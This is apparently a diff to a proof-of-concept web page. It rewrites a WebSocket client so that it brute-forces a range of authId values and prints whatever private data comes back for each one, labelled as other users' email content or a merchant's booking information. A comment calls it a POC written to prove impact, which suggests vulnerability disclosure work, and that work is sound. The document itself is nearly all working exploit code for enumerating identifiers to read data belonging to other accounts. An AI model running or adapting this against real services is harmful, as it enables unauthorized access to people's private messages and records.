@@ -10,13 +10,17 @@
 	  function init()
 	  {
 		output = document.getElementById("output");
-		testWebSocket();
+		 writeToScreen("Try to brute your authId......");
+		for(var i = 34028803;i <= 34028883;i++){
+			writeToScreen("authId is" + i);
+			testWebSocket(i);
+		}
 	  }
 
-	  function testWebSocket()
+	  function testWebSocket(authId)
 	  {
 		websocket = new WebSocket(wsUri);
-		websocket.onopen = function(evt) { onOpen(evt,34028873) };
+		websocket.onopen = function(evt) { onOpen(evt,authId) };
 		websocket.onclose = function(evt) { onClose(evt) };
 		websocket.onmessage = function(evt) { onMessage(evt) };
 		websocket.onerror = function(evt) { onError(evt) };
@@ -36,9 +40,12 @@
 	  function onMessage(evt)
 	  {
 	 	let data = JSON.parse(evt.data);
-        
-                writeToScreen('<span style="color: red;">该商家实时预定信息:</span> ' + JSON.stringify(data));
-		    //just a POC for prove the impact,Didn't wrote a feature for keeping on WSS connection.
+        	if(data.type === "END_READ"){
+                	//writeToScreen('<span style="color: red;">Your email content:</span> ');
+		    	//just a POC for prove the impact,Didn't wrote a feature for keeping on WSS connection.
+		}else{
+			writeToScreen('<span style="color: red;">BOOM!Your email content:</span> ' + JSON.stringify(data));
+		}
 	  }
 
 	  function onError(evt)
